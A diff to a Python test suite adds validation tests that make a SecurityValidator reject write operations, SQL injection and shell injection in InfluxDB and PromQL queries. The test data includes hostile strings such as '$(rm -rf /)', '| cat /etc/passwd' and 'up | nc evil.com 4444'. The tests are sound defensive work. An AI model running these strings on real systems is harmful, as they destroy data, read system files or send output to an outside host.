@@ -329,6 +329,9 @@ class TestToolSecurity:
             "list_service_files",
             "search_service_logs",
             "get_server_health",
+            "query_influxdb",
+            "query_prometheus",
+            "get_prometheus_targets",
         }
 
         # All registered tools should be in expected list
@@ -411,6 +414,124 @@ class TestAttackScenarios:
             assert '"' not in sanitized
             assert "`" not in sanitized
             assert "$" not in sanitized
+
+
+# ============================================================================
+# Database Query Validation Tests
+# ============================================================================
+
+
+class TestInfluxDBQueryValidation:
+    """Test InfluxDB v3 SQL query validation."""
+
+    def setup_method(self):
+        self.security = SecurityValidator({})
+
+    def test_valid_select_queries(self):
+        """Valid SELECT queries should be accepted."""
+        valid_queries = [
+            "SELECT * FROM cpu",
+            "SELECT mean(value) FROM metrics WHERE time > now() - 1h",
+            "SELECT count(*) FROM logs GROUP BY host",
+            "  SELECT * FROM measurements LIMIT 100",
+        ]
+        for query in valid_queries:
+            result = self.security.validate_influxdb_query(query)
+            assert result is not None, f"Should allow valid query: {query}"
+
+    def test_write_operations_blocked(self):
+        """Write operations should be blocked."""
+        write_queries = [
+            "DROP MEASUREMENT cpu",
+            "DELETE FROM metrics WHERE time < now() - 30d",
+            "INSERT INTO cpu VALUES (1, 2, 3)",
+            "UPDATE metrics SET value = 100",
+            "ALTER TABLE cpu ADD COLUMN host STRING",
+            "CREATE DATABASE testdb",
+            "TRUNCATE TABLE logs",
+            "GRANT ALL TO admin",
+            "REVOKE READ FROM user",
+            "KILL QUERY 12345",
+        ]
+        for query in write_queries:
+            result = self.security.validate_influxdb_query(query)
+            assert result is None, f"Should block write operation: {query}"
+
+    def test_sql_injection_blocked(self):
+        """SQL injection characters should be blocked."""
+        injection_queries = [
+            "SELECT * FROM cpu; DROP TABLE metrics",
+            "SELECT * FROM cpu -- comment",
+            "SELECT * FROM cpu /* comment */",
+        ]
+        for query in injection_queries:
+            result = self.security.validate_influxdb_query(query)
+            assert result is None, f"Should block SQL injection: {query}"
+
+    def test_shell_injection_blocked(self):
+        """Shell injection characters should be blocked."""
+        injection_queries = [
+            "SELECT * FROM cpu `whoami`",
+            "SELECT * FROM cpu $(rm -rf /)",
+            "SELECT * FROM cpu | cat /etc/passwd",
+        ]
+        for query in injection_queries:
+            result = self.security.validate_influxdb_query(query)
+            assert result is None, f"Should block shell injection: {query}"
+
+    def test_query_length_limit(self):
+        """Very long queries should be rejected."""
+        long_query = "SELECT * FROM " + "a" * 6000
+        result = self.security.validate_influxdb_query(long_query)
+        assert result is None
+
+
+class TestPrometheusQueryValidation:
+    """Test PromQL query validation."""
+
+    def setup_method(self):
+        self.security = SecurityValidator({})
+
+    def test_valid_promql_queries(self):
+        """Valid PromQL queries should be accepted."""
+        valid_queries = [
+            "up",
+            "rate(http_requests_total[5m])",
+            "histogram_quantile(0.95, rate(bucket[5m]))",
+        ]
+        for query in valid_queries:
+            result = self.security.validate_prometheus_query(query)
+            assert result is not None, f"Should allow valid query: {query}"
+
+    def test_shell_injection_blocked(self):
+        """Shell injection characters should be blocked."""
+        injection_queries = [
+            "up; cat /etc/passwd",
+            "`whoami`",
+            "$(rm -rf /)",
+            "up | nc evil.com 4444",
+            "up > /dev/null",
+            "up & shutdown",
+        ]
+        for query in injection_queries:
+            result = self.security.validate_prometheus_query(query)
+            assert result is None, f"Should block shell injection: {query}"
+
+    def test_quote_injection_blocked(self):
+        """Quotes should be blocked to prevent shell escaping."""
+        quoted_queries = [
+            'up{job="test"}',
+            "up{job='test'}",
+        ]
+        for query in quoted_queries:
+            result = self.security.validate_prometheus_query(query)
+            assert result is None, f"Should block quote injection: {query}"
+
+    def test_query_length_limit(self):
+        """Very long queries should be rejected."""
+        long_query = "up{" + "a" * 6000
+        result = self.security.validate_prometheus_query(long_query)
+        assert result is None
 
 
 # ============================================================================
